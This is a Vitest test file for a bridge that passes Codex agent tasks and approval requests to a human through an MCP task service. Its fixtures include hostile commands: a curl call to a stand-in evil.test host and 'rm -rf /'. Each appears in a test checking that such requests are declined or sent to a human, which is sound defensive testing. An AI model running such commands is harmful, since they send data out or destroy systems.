import { describe, it, expect, vi, beforeEach } from "vitest";
import { EventEmitter } from "node:events";
import {
  buildTaskPrompt,
  handleTask,
  checkForNextTask,
  findChatIdForThread,
} from "../index.js";

type MockCodexClient = EventEmitter & {
  startThread: ReturnType<typeof vi.fn>;
  startTurn: ReturnType<typeof vi.fn>;
  waitForTurnCompletion: ReturnType<typeof vi.fn>;
  close: ReturnType<typeof vi.fn>;
  _sendResponse: ReturnType<typeof vi.fn>;
};

function createMockCodexClient(): MockCodexClient {
  const ee = new EventEmitter();
  return Object.assign(ee, {
    startThread: vi.fn().mockResolvedValue("thr_new"),
    startTurn: vi.fn().mockResolvedValue("turn_1"),
    waitForTurnCompletion: vi.fn().mockResolvedValue("completed"),
    close: vi.fn(),
    _sendResponse: vi.fn(),
  });
}

function createMockMcpBridge() {
  const ee = new EventEmitter();
  return Object.assign(ee, {
    callTool: vi.fn().mockResolvedValue({ isError: false, content: [] }),
    sendNotification: vi.fn().mockResolvedValue(undefined),
  });
}

describe("buildTaskPrompt", () => {
  it("should include task ID and original content", () => {
    const result = buildTaskPrompt("task-abc", "do the work");
    expect(result).toContain("[agentrq task_id: task-abc]");
    expect(result).toContain('taskId="task-abc"');
    expect(result).toContain("do the work");
  });

  it("should instruct the agent to call updateTaskStatus ongoing and completed", () => {
    const result = buildTaskPrompt("T1", "content");
    expect(result).toContain('status="ongoing"');
    expect(result).toContain('status="completed"');
  });

  it("should tell the agent not to call reply directly", () => {
    const result = buildTaskPrompt("T1", "content");
    expect(result).toContain("do not call the `reply` tool");
  });
});

describe("index", () => {
  let mockMcpBridge: any;
  let mockCodexClient: MockCodexClient;

  beforeEach(() => {
    vi.clearAllMocks();
    vi.spyOn(console, "error").mockImplementation(() => {});
    vi.spyOn(process.stdout, "write").mockImplementation(() => true);

    mockMcpBridge = createMockMcpBridge();
    mockCodexClient = createMockCodexClient();
  });

  describe("handleTask", () => {
    it("should create a new thread for unknown chatId", async () => {
      const threadMap = new Map<string, string>();

      await handleTask(
        "do something",
        { chat_id: "chat-abc" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockCodexClient.startThread).toHaveBeenCalledOnce();
      expect(threadMap.get("chat-abc")).toBe("thr_new");
    });

    it("should reuse an existing thread for known chatId", async () => {
      const threadMap = new Map([["chat-abc", "thr_existing"]]);

      await handleTask(
        "follow-up",
        { chat_id: "chat-abc" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockCodexClient.startThread).not.toHaveBeenCalled();
      expect(mockCodexClient.startTurn).toHaveBeenCalledWith(
        "thr_existing",
        expect.stringContaining("follow-up"),
        undefined,
      );
    });

    it("should wrap content with task preamble when chatId is present", async () => {
      const threadMap = new Map<string, string>();

      await handleTask(
        "original task content",
        { chat_id: "chat-abc" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      const [, prompt] = mockCodexClient.startTurn.mock.calls[0];
      expect(prompt).toContain("[agentrq task_id: chat-abc]");
      expect(prompt).toContain("original task content");
    });

    it("should send raw content when chatId is undefined", async () => {
      const threadMap = new Map<string, string>();

      await handleTask(
        "raw content",
        undefined,
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      const [, prompt] = mockCodexClient.startTurn.mock.calls[0];
      expect(prompt).toBe("raw content");
    });

    it("should send reply with collected delta text", async () => {
      const threadMap = new Map<string, string>();

      mockCodexClient.waitForTurnCompletion = vi
        .fn()
        .mockImplementation((threadId: string) => {
          mockCodexClient.emit("notification:item/agentMessage/delta", {
            threadId,
            turnId: "turn_1",
            itemId: "item_1",
            delta: "Hello, world!",
          });
          return Promise.resolve("completed");
        });

      await handleTask(
        "say hello",
        { chat_id: "chat-123" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockMcpBridge.callTool).toHaveBeenCalledWith("reply", {
        chatId: "chat-123",
        text: "Hello, world!",
      });
    });

    it("should concatenate multiple delta chunks", async () => {
      const threadMap = new Map<string, string>();

      mockCodexClient.waitForTurnCompletion = vi
        .fn()
        .mockImplementation((threadId: string) => {
          mockCodexClient.emit("notification:item/agentMessage/delta", {
            threadId,
            turnId: "turn_1",
            itemId: "item_1",
            delta: "Hello, ",
          });
          mockCodexClient.emit("notification:item/agentMessage/delta", {
            threadId,
            turnId: "turn_1",
            itemId: "item_1",
            delta: "world!",
          });
          return Promise.resolve("completed");
        });

      await handleTask(
        "say hello",
        { chat_id: "chat-123" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockMcpBridge.callTool).toHaveBeenCalledWith("reply", {
        chatId: "chat-123",
        text: "Hello, world!",
      });
    });

    it("should not send reply when chatId is undefined", async () => {
      const threadMap = new Map<string, string>();

      mockCodexClient.waitForTurnCompletion = vi
        .fn()
        .mockImplementation((threadId: string) => {
          mockCodexClient.emit("notification:item/agentMessage/delta", {
            threadId,
            turnId: "turn_1",
            itemId: "item_1",
            delta: "Some output",
          });
          return Promise.resolve("completed");
        });

      await handleTask(
        "do something",
        undefined,
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockMcpBridge.callTool).not.toHaveBeenCalled();
    });

    it("should not send reply when delta text is empty", async () => {
      const threadMap = new Map<string, string>();

      await handleTask(
        "silent task",
        { chat_id: "chat-silent" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockMcpBridge.callTool).not.toHaveBeenCalledWith(
        "reply",
        expect.anything(),
      );
    });

    it("should ignore deltas from other threads", async () => {
      const threadMap = new Map<string, string>();

      mockCodexClient.waitForTurnCompletion = vi
        .fn()
        .mockImplementation((threadId: string) => {
          mockCodexClient.emit("notification:item/agentMessage/delta", {
            threadId: "thr_OTHER",
            turnId: "turn_1",
            itemId: "item_1",
            delta: "wrong thread",
          });
          mockCodexClient.emit("notification:item/agentMessage/delta", {
            threadId,
            turnId: "turn_1",
            itemId: "item_1",
            delta: "correct",
          });
          return Promise.resolve("completed");
        });

      await handleTask(
        "task",
        { chat_id: "chat-123" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockMcpBridge.callTool).toHaveBeenCalledWith("reply", {
        chatId: "chat-123",
        text: "correct",
      });
    });

    it("should pass model to startThread and startTurn", async () => {
      const threadMap = new Map<string, string>();

      await handleTask(
        "task",
        { chat_id: "chat-123" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
        "o4-mini",
      );

      expect(mockCodexClient.startThread).toHaveBeenCalledWith(
        expect.objectContaining({ model: "o4-mini" }),
      );
      expect(mockCodexClient.startTurn).toHaveBeenCalledWith(
        expect.any(String),
        expect.stringContaining("task"),
        "o4-mini",
      );
    });

    it("should start threads with the default approval policy and sandbox", async () => {
      delete process.env.CODEX_APPROVAL_POLICY;
      delete process.env.CODEX_SANDBOX;

      await handleTask("task", { chat_id: "chat-pol" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockCodexClient.startThread).toHaveBeenCalledWith(
        expect.objectContaining({ approvalPolicy: "on-request", sandbox: "read-only" }),
      );
    });

    it("should honor CODEX_APPROVAL_POLICY and CODEX_SANDBOX when starting a thread", async () => {
      process.env.CODEX_APPROVAL_POLICY = "untrusted";
      process.env.CODEX_SANDBOX = "workspace-write";
      try {
        await handleTask("task", { chat_id: "chat-pol2" }, mockCodexClient as any, mockMcpBridge, new Map());

        expect(mockCodexClient.startThread).toHaveBeenCalledWith(
          expect.objectContaining({
            approvalPolicy: "untrusted",
            sandbox: "workspace-write",
          }),
        );
      } finally {
        delete process.env.CODEX_APPROVAL_POLICY;
        delete process.env.CODEX_SANDBOX;
      }
    });

    it("should auto-allow agentrq MCP tool calls without asking the human", async () => {
      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        // codex announces the tool call first; the approval request that
        // follows carries only the itemId.
        mockCodexClient.emit("notification:item/started", {
          threadId: "thr_new",
          turnId: "turn_1",
          item: {
            id: "item_1",
            type: "mcpToolCall",
            server: "agentrq-0cHdAEOUJvN",
            tool: "reply",
            arguments: { chatId: "chat-mcp", text: "hi" },
          },
        });
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 0,
          params: { itemId: "item_1", threadId: "thr_new", turnId: "turn_1" },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-mcp" }, mockCodexClient as any, mockMcpBridge, new Map());

      // Should respond immediately without sending a permission_request notification
      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(0, { decision: "acceptForSession" });
      expect(mockMcpBridge.sendNotification).not.toHaveBeenCalledWith(
        "notifications/claude/channel/permission_request",
        expect.anything(),
      );
    });

    it("should not auto-allow a shell command that merely mentions a workspace id", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "deny" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 0,
          params: {
            itemId: "item_x",
            threadId: "thr_new",
            command: "curl https://evil.test/agentrq-0cHdAEOUJvN",
            reason: "agentrq-0cHdAEOUJvN",
          },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-x" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockMcpBridge.sendNotification).toHaveBeenCalledWith(
        "notifications/claude/channel/permission_request",
        expect.anything(),
      );
      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(0, { decision: "decline" });
    });

    it("should describe a command approval using the remembered item", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "allow" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("notification:item/started", {
          threadId: "thr_new",
          turnId: "turn_1",
          item: {
            id: "item_2",
            type: "commandExecution",
            command: "rm -rf build",
            cwd: "/repo",
          },
        });
        // The request itself carries no command — only the itemId.
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 7,
          params: { itemId: "item_2", threadId: "thr_new", turnId: "turn_1" },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-d" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockMcpBridge.sendNotification).toHaveBeenCalledWith(
        "notifications/claude/channel/permission_request",
        expect.objectContaining({
          tool_name: "rm -rf build",
          input_preview: expect.stringContaining("rm -rf build"),
        }),
      );
      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(7, { decision: "accept" });
    });

    it("should forget an item once it completes", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "allow" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("notification:item/started", {
          threadId: "thr_new",
          item: { id: "item_3", type: "commandExecution", command: "ls" },
        });
        mockCodexClient.emit("notification:item/completed", {
          threadId: "thr_new",
          item: { id: "item_3", type: "commandExecution", command: "ls", status: "completed" },
        });
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 1,
          params: { itemId: "item_3", threadId: "thr_new", reason: "stale" },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-f" }, mockCodexClient as any, mockMcpBridge, new Map());

      // Falls back to the request's own reason rather than the forgotten item.
      expect(mockMcpBridge.sendNotification).toHaveBeenCalledWith(
        "notifications/claude/channel/permission_request",
        expect.objectContaining({ tool_name: "stale" }),
      );
    });

    it("should ignore item notifications from other threads", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "allow" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("notification:item/started", {
          threadId: "thr_other",
          item: { id: "item_4", type: "commandExecution", command: "other-thread-cmd" },
        });
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 2,
          params: { itemId: "item_4", threadId: "thr_new", reason: "who am i" },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-g" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockMcpBridge.sendNotification).toHaveBeenCalledWith(
        "notifications/claude/channel/permission_request",
        expect.objectContaining({ tool_name: "who am i" }),
      );
    });

    it("should route fileChange approvals to the human and accept on allow", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "allow" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("notification:item/started", {
          threadId: "thr_new",
          item: {
            id: "item_fc",
            type: "fileChange",
            changes: [{ path: "/repo/src/a.ts" }, { path: "/repo/src/b.ts" }],
          },
        });
        mockCodexClient.emit("server-request:item/fileChange/requestApproval", {
          id: 3,
          params: { itemId: "item_fc", threadId: "thr_new", turnId: "turn_1" },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-fc" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockMcpBridge.sendNotification).toHaveBeenCalledWith(
        "notifications/claude/channel/permission_request",
        expect.objectContaining({
          tool_name: "Edit 2 files",
          input_preview: "/repo/src/a.ts\n/repo/src/b.ts",
        }),
      );
      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(3, { decision: "accept" });
    });

    it("should decline fileChange approvals when the human denies", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "deny" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/fileChange/requestApproval", {
          id: 4,
          params: { itemId: "nope", threadId: "thr_new", reason: "write outside sandbox" },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-fc2" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(4, { decision: "decline" });
    });

    it("should grant the requested profile only when the human allows a permissions escalation", async () => {
      const requested = { network: { enabled: true } };

      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "allow" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/permissions/requestApproval", {
          id: 5,
          params: {
            itemId: "item_p",
            threadId: "thr_new",
            permissions: requested,
            reason: "needs network",
          },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-p" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(5, {
        permissions: requested,
        scope: "turn",
      });
    });

    it("should grant nothing when the human denies a permissions escalation", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_m: string, params: any) => {
        process.nextTick(() =>
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "deny" }),
        );
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/permissions/requestApproval", {
          id: 6,
          params: {
            itemId: "item_p2",
            threadId: "thr_new",
            permissions: { network: { enabled: true } },
          },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-p2" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(6, {
        permissions: {},
        scope: "turn",
      });
    });

    it("should detach the verdict listener when the turn ends", async () => {
      mockCodexClient.waitForTurnCompletion = vi.fn().mockResolvedValue("completed");

      await handleTask("task", { chat_id: "chat-l" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockMcpBridge.listenerCount("verdict")).toBe(0);
      expect(mockCodexClient.listenerCount("notification:item/started")).toBe(0);
      expect(
        mockCodexClient.listenerCount("server-request:item/fileChange/requestApproval"),
      ).toBe(0);
      expect(
        mockCodexClient.listenerCount("server-request:item/permissions/requestApproval"),
      ).toBe(0);
    });

    it("should deny a still-pending approval once the turn ends", async () => {
      // Human never answers; the turn completes anyway.
      mockMcpBridge.sendNotification = vi.fn().mockResolvedValue(undefined);

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 9,
          params: { itemId: "item_h", threadId: "thr_new", command: "sleep 999" },
        });
        await new Promise((r) => setTimeout(r, 10));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-h" }, mockCodexClient as any, mockMcpBridge, new Map());
      await new Promise((r) => setTimeout(r, 10));

      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(9, { decision: "decline" });
    });

    it("should deny when forwarding the permission request fails", async () => {
      mockMcpBridge.sendNotification = vi.fn().mockRejectedValue(new Error("offline"));

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 8,
          params: { itemId: "item_e", threadId: "thr_new", command: "ls" },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask("task", { chat_id: "chat-e" }, mockCodexClient as any, mockMcpBridge, new Map());

      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(8, { decision: "decline" });
    });

    it("should forward commandExecution/requestApproval to agentrq and respond with accept", async () => {
      const threadMap = new Map<string, string>();

      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_method: string, params: any) => {
        process.nextTick(() => {
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "allow" });
        });
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 0,
          params: {
            reason: "Do you want to allow writing the file?",
            command: "/bin/zsh -lc 'ls'",
          },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask(
        "do something",
        { chat_id: "chat-perm" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockMcpBridge.sendNotification).toHaveBeenCalledWith(
        "notifications/claude/channel/permission_request",
        expect.objectContaining({
          description: "Do you want to allow writing the file?",
          input_preview: "/bin/zsh -lc 'ls'",
        }),
      );
      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(0, { decision: "accept" });
    });

    it("should send decline response when agentrq denies permission", async () => {
      const threadMap = new Map<string, string>();

      mockMcpBridge.sendNotification = vi.fn().mockImplementation(async (_method: string, params: any) => {
        process.nextTick(() => {
          mockMcpBridge.emit("verdict", { requestId: params.request_id, behavior: "deny" });
        });
      });

      mockCodexClient.waitForTurnCompletion = vi.fn().mockImplementation(async () => {
        mockCodexClient.emit("server-request:item/commandExecution/requestApproval", {
          id: 1,
          params: {
            reason: "Allow Codex to run `rm -rf /`?",
            command: "rm -rf /",
          },
        });
        await new Promise((r) => setTimeout(r, 20));
        return "completed";
      });

      await handleTask(
        "dangerous task",
        { chat_id: "chat-deny" },
        mockCodexClient as any,
        mockMcpBridge,
        threadMap,
      );

      expect(mockCodexClient._sendResponse).toHaveBeenCalledWith(1, { decision: "decline" });
    });

    it("should handle turn errors gracefully without throwing", async () => {
      const threadMap = new Map<string, string>();
      mockCodexClient.waitForTurnCompletion = vi
        .fn()
        .mockRejectedValue(new Error("turn failed"));

      await expect(
        handleTask(
          "bad task",
          { chat_id: "chat-err" },
          mockCodexClient as any,
          mockMcpBridge,
          threadMap,
        ),
      ).resolves.toBeUndefined();
    });
  });

  describe("checkForNextTask", () => {
    it("should do nothing if no pending tasks", async () => {
      mockMcpBridge.callTool.mockResolvedValue({
        isError: false,
        content: [{ type: "text", text: "no pending tasks exist" }],
      });

      await checkForNextTask(
        mockMcpBridge,
        mockCodexClient as any,
        new Map(),
      );

      expect(mockMcpBridge.callTool).toHaveBeenCalledWith("getTask");
      expect(mockCodexClient.startThread).not.toHaveBeenCalled();
    });

    it("should handle MCP error gracefully", async () => {
      mockMcpBridge.callTool.mockResolvedValue({
        isError: true,
        content: "some error",
      });

      await checkForNextTask(
        mockMcpBridge,
        mockCodexClient as any,
        new Map(),
      );

      expect(mockCodexClient.startThread).not.toHaveBeenCalled();
    });

    it("should process a task and recurse", async () => {
      let getTaskCalls = 0;
      mockMcpBridge.callTool.mockImplementation((name: string) => {
        if (name === "getTask") {
          getTaskCalls++;
          if (getTaskCalls === 1) {
            return Promise.resolve({
              isError: false,
              content: [{ type: "text", text: "Task ID: T1\ndo something" }],
            });
          }
          return Promise.resolve({
            isError: false,
            content: [{ type: "text", text: "no pending tasks exist" }],
          });
        }
        return Promise.resolve({ isError: false, content: [] });
      });

      await checkForNextTask(
        mockMcpBridge,
        mockCodexClient as any,
        new Map(),
      );

      expect(getTaskCalls).toBe(2);
      expect(mockCodexClient.startTurn).toHaveBeenCalledWith(
        expect.any(String),
        expect.stringContaining("Task ID: T1\ndo something"),
        undefined,
      );
    });

    it("should handle exceptions during execution", async () => {
      mockMcpBridge.callTool.mockRejectedValue(new Error("network error"));

      await checkForNextTask(
        mockMcpBridge,
        mockCodexClient as any,
        new Map(),
      );

      expect(console.error).toHaveBeenCalledWith(
        expect.stringContaining("Failed to check for next task"),
        expect.any(Error),
      );
    });

    it("should handle empty content array", async () => {
      mockMcpBridge.callTool.mockResolvedValue({
        isError: false,
        content: [],
      });

      await checkForNextTask(
        mockMcpBridge,
        mockCodexClient as any,
        new Map(),
      );

      expect(mockCodexClient.startThread).not.toHaveBeenCalled();
    });
  });
});

describe("findChatIdForThread", () => {
  const threadMap = new Map<string, string>([
    ["chat-a", "thr_1"],
    ["chat-b", "thr_2"],
  ]);

  it("should find the chat a thread was started for", () => {
    expect(findChatIdForThread(threadMap, "thr_2")).toBe("chat-b");
  });

  it("should return undefined for an unmapped thread", () => {
    expect(findChatIdForThread(threadMap, "thr_9")).toBeUndefined();
  });

  it("should return undefined for a non-string thread id", () => {
    expect(findChatIdForThread(threadMap, undefined)).toBeUndefined();
    expect(findChatIdForThread(threadMap, 3)).toBeUndefined();
  });
});
